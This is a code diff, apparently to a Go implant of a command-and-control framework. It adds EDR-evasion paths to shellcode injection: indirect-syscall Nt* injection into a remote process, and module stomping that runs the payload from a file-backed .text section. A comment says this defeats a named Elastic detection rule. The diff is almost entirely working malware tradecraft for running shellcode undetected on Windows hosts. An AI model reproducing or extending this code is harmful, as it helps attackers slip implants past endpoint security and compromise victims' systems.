@@ -72,6 +72,21 @@ func injectTask(processHandle windows.Handle, data []byte, rwxPages bool) (windo
 		threadHandle windows.Handle
 	)
 	dataSize := len(data)
+	// {{if .Config.Evasion}}
+	// Preferred path: full Nt* indirect-syscall injection (alloc/write/protect/thread
+	// all executed from an ntdll gadget — no kernel32 surface). Falls back to the
+	// classic Win32 chain below on any resolution or execution failure.
+	if ntHandle, ntErr := evasion.NTInjectTask(processHandle, data, rwxPages); ntErr == nil {
+		// {{if .Config.Debug}}
+		log.Println("[injectTask] NT indirect-syscall injection succeeded")
+		// {{end}}
+		return ntHandle, nil
+	} else {
+		// {{if .Config.Debug}}
+		log.Printf("[injectTask] NT injection failed (%v), falling back to Win32 path", ntErr)
+		// {{end}}
+	}
+	// {{end}}
 	// Remotely allocate memory in the target process
 	// {{if .Config.Debug}}
 	log.Println("allocating remote process memory ...")
@@ -188,6 +203,24 @@ func localTaskInner(data []byte, rwxPages bool) error {
 			return err
 		}
 	}
+	// {{if .Config.Evasion}}
+	// Preferred: execute from MEM_IMAGE (module stomping) — payload runs from
+	// a file-backed .text section, defeating unbacked-memory provenance checks
+	// (Elastic `unbacked_shellcode_from_unsigned_module` et al.).
+	// Falls back to the classic MEM_PRIVATE path below on any failure.
+	if stompRes, stompErr := evasion.ModuleStompExecute(data, ""); stompErr == nil {
+		// {{if .Config.Debug}}
+		log.Printf("[LocalTask] module stomping execution OK: dll=%s text=0x%x thread=0x%x",
+			stompRes.DllPath, stompRes.TextBase, stompRes.ThreadHandle)
+		// {{end}}
+		windows.CloseHandle(stompRes.ThreadHandle)
+		return nil
+	} else {
+		// {{if .Config.Debug}}
+		log.Printf("[LocalTask] module stomping failed (%v), falling back to private memory", stompErr)
+		// {{end}}
+	}
+	// {{end}}
 	size := len(data)
 	addr, _ := sysAlloc(size, rwxPages)
 	for index := 0; index < size; index++ {
